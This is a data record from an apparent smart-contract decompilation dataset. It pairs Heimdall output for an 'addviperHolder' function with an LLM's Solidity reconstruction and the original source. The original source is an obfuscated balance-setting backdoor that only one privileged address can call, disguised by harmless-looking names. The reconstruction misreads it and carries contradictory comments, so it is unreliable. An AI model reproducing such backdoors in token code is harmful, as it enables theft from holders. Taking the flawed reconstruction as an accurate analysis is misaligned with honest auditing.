{
    "contract_address": "0x8a24fF8ffc247330F89865e58587858626eB504e",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "pragma solidity ^0.8.24;\n\ncontract ViperHolderRegistry {\n    // Storage\n    mapping(address => uint256) private _holderBalance;\n    address private immutable _owner;\n\n    constructor() {\n        _owner = msg.sender;\n    }\n\n    /**\n     * @notice Adds (or updates) a Viper holder balance.\n     * @dev Logic mirrors the structure of the decompiled byte-code; seemingly\n     *      redundant statements are intentionally preserved.\n     */\n    function addViperHolder(address holder, uint256 amount) external payable {\n        // ---------------------------------------------------------------------\n        // These first three require-statements correspond 1:1 with the\n        // decompiled output (even if redundant or tautological).\n        // ---------------------------------------------------------------------\n        require(holder == address(holder));           // always true\n\n        require(msg.sender == _owner);                // original equality check\n\n        require(0 < 0x64);                            // always true (10 < 100)\n        // ---------------------------------------------------------------------\n\n        // First write to storage (mirrors decompiled flow)\n        _holderBalance[holder] = amount;\n\n        // Redundant local assignments preserved from decompiled code\n        bytes32 _unusedPanicSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        uint8  _unusedPanicCode     = 0x11;\n\n        // Another always-true check retained from the decompiled output\n        require(0 < 0x0a);                            // always true (0 < 10)\n\n        // Same redundant assignments once more (as in decompiled flow)\n        _unusedPanicSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        _unusedPanicCode     = 0x11;\n\n        // Second write to storage, exactly as in the decompiled sequence\n        _holderBalance[holder] = amount;\n\n        // Silence compiler warnings about unused variables\n        _unusedPanicSelector;\n        _unusedPanicCode;\n    }\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}